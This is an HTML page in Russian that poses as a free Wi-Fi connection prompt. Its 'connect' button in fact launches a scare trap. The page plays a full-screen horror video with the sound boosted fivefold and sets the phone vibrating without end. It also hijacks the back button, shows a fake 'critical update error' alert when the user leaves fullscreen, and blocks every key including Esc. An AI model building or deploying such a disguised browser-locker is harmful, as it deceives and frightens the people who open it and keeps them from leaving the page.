<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Wi-Fi Connect</title>
    <style>
        body {
            margin: 0; padding: 0; background: #f2f2f7;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            display: flex; justify-content: center; align-items: center;
            height: 100vh; overflow: hidden; user-select: none;
        }
        #ui { text-align: center; width: 90%; }
        .wifi-loader {
            width: 80px; height: 80px; border: 4px solid #007aff;
            border-radius: 50%; border-top-color: transparent;
            animation: spin 1s linear infinite; margin: 0 auto 20px;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        h1 { font-size: 24px; color: #000; margin-bottom: 10px; }
        p { color: #8e8e93; font-size: 16px; margin-bottom: 30px; }
        button {
            background: #007aff; color: white; border: none;
            width: 100%; max-width: 300px; padding: 18px;
            font-size: 20px; border-radius: 14px; font-weight: 600;
            cursor: pointer; active { background: #0051a8; }
        }
        #screamer-wrap {
            display: none; position: fixed; top: 0; left: 0;
            width: 100vw; height: 100vh; background: #000; z-index: 9999;
        }
        video { width: 100%; height: 100%; object-fit: cover; }
    </style>
</head>
<body oncontextmenu="return false;">

    <div id="ui">
        <div class="wifi-loader"></div>
        <h1>Доступна сеть "Free_WiFi_HighSpeed"</h1>
        <p>Для подключения нажмите кнопку ниже</p>
        <button onclick="startTrap()">ПОДКЛЮЧИТЬ</button>
    </div>

    <div id="screamer-wrap">
        <video id="scaryVideo" playsinline loop>
            <source src="1909901693.mp4" type="video/mp4">
        </video>
    </div>

    <script>
        const video = document.getElementById('scaryVideo');
        const wrap = document.getElementById('screamer-wrap');

        async function startTrap() {
            // 1. Полноэкранный режим
            const doc = document.documentElement;
            if (doc.requestFullscreen) doc.requestFullscreen();
            else if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();

            // 2. Переворот экрана в горизонтальный режим (Landscape)
            if (screen.orientation && screen.orientation.lock) {
                screen.orientation.lock('landscape').catch(() => {
                    console.log("Нужен клик для переворота");
                });
            }

            // 3. Звук на максимум (программное усиление)
            try {
                const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
                const source = audioCtx.createMediaElementSource(video);
                const gain = audioCtx.createGain();
                gain.gain.value = 5.0; // Усиление в 5 раз
                source.connect(gain);
                gain.connect(audioCtx.destination);
            } catch (e) {}

            // 4. Показываем видео
            document.getElementById('ui').style.display = 'none';
            wrap.style.display = 'block';
            video.play();

            // 5. Бесконечная вибрация
            if (navigator.vibrate) {
                setInterval(() => navigator.vibrate([500, 100, 500, 100]), 1000);
            }

            // 6. БЛОКИРОВКА ВЫХОДА (Психологическая и техническая)
            
            // Запрет кнопки "Назад"
            window.history.pushState(null, null, window.location.href);
            window.onpopstate = () => {
                window.history.pushState(null, null, window.location.href);
                enterFull(); // Возвращаем фуллскрин при попытке выйти
            };

            // Предупреждение при закрытии вкладки
            window.onbeforeunload = () => "СИСТЕМА ЗАБЛОКИРОВАНА!";

            // Если он выйдет из фуллскрина (свайпом), сразу выкидываем ошибку
            document.addEventListener('fullscreenchange', () => {
                if (!document.fullscreenElement) {
                    alert("КРИТИЧЕСКАЯ ОШИБКА ОБНОВЛЕНИЯ! Нажмите ОК для восстановления.");
                    enterFull();
                }
            });
        }

        function enterFull() {
            const doc = document.documentElement;
            if (doc.requestFullscreen) doc.requestFullscreen();
            else if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();
        }

        // Блокировка клавиш (на случай если он с клавиатурой)
        document.onkeydown = (e) => {
            return false; // Отключает всё, включая F12 и Esc
        };
    </script>
</body>
</html>
